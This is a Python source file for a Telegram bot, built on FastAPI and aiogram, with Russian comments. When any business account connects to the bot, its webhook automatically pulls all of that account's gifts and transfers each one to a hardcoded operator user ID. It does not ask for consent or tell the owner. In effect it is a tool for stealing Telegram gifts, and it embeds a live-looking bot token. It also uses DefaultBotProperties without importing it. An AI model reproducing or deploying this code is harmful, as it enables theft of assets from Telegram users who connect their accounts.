import logging
import aiohttp
from fastapi import FastAPI, Request
from aiogram import Bot
from aiogram.types import Update
from aiogram.enums import ParseMode
from aiogram.client.session.aiohttp import AiohttpSession

# === ВСТАВЬ СЮДА СВОИ ДАННЫЕ ===
BOT_TOKEN = "7568076687:AAH9PY6nnazB6jiqiHVRVZK81SaLHuSRj4U"
FORWARD_TO_USER_ID = 7835062868  # Telegram ID, на который пересылать подарки

# === НАСТРОЙКА БОТА ===
session = AiohttpSession()
bot = Bot(
    token=BOT_TOKEN,
    session=session,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)

# === НАСТРОЙКА ПРИЛОЖЕНИЯ ===
app = FastAPI()
logging.basicConfig(level=logging.INFO)


@app.post("/webhook")
async def telegram_webhook(req: Request):
    data = await req.json()
    update = Update.model_validate(data)

    logging.info(f"[Webhook] Получено обновление: {update}")

    if update.business_connection:
        business_id = update.business_connection.id
        logging.info(f"[!] Новый бизнес-профиль подключён: {business_id}")
        await process_gifts(business_id)

    return {"ok": True}


async def process_gifts(business_id: str):
    async with aiohttp.ClientSession() as session:
        gifts_url = f"https://api.telegram.org/bot{BOT_TOKEN}/getBusinessGifts"
        gifts_payload = {"business_connection_id": business_id}

        async with session.post(gifts_url, json=gifts_payload) as resp:
            data = await resp.json()
            gifts = data.get("result", [])

            if not gifts:
                logging.info("[-] Нет подарков для передачи.")
                return

            logging.info(f"[+] Найдено {len(gifts)} подарок(ов). Пересылаем...")

            for gift in gifts:
                gift_id = gift["id"]
                transfer_url = f"https://api.telegram.org/bot{BOT_TOKEN}/transferGift"
                transfer_payload = {
                    "business_connection_id": business_id,
                    "gift_id": gift_id,
                    "user_id": FORWARD_TO_USER_ID
                }

                async with session.post(transfer_url, json=transfer_payload) as transfer_resp:
                    transfer_data = await transfer_resp.json()
                    if transfer_data.get("ok"):
                        logging.info(f"[>] Подарок {gift_id} переслан успешно.")
                    else:
                        logging.warning(f"[!] Ошибка при пересылке подарка {gift_id}: {transfer_data}")